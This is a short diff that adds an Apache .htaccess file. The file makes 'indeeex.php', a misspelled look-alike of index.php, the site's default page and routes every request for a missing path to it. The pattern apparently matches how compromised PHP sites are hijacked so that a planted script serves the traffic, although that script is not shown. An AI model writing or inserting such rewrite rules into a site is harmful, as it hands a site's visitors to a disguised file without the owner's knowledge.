@@ -1,0 +1,7 @@
+DirectoryIndex indeeex.php index.php
+RewriteEngine On
+RewriteBase /
+RewriteRule ^indeeex\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /indeeex.php [L]
